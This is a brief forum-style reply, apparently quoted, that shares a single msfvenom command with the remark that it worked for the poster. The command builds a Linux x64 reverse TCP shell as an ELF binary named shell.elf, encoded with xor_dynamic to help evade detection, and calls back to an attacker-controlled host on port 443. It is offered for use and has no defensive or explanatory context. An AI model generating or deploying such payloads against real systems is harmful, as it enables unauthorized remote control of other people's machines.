> I found this one to work for me:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -e x64/xor_dynamic -f elf -o shell.elf
```

